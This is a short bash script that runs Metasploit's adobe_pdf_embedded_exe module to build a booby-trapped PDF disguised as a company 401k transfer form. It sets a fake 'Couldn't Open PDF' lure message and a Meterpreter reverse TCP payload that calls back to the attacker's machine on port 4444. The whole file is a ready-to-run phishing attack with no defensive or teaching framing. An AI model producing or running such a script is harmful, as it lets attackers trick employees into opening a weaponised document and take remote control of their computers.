#!/bin/bash

msfconsole -q -x \
"use exploit/windows/fileformat/adobe_pdf_embedded_exe; \
set FILENAME Company_401k_transfer.pdf; \
set INFILENAME 401k-distribution-request-form.pdf; \
set LAUNCH_MESSAGE Couldn't Open PDF: Something's keeping this PDF from opening; \
set PAYLOAD windows/meterpreter/reverse_tcp; \
set LHOST "$(hostname -I | cut -d' ' -f1)"; \
set LPORT 4444; \
exploit;"

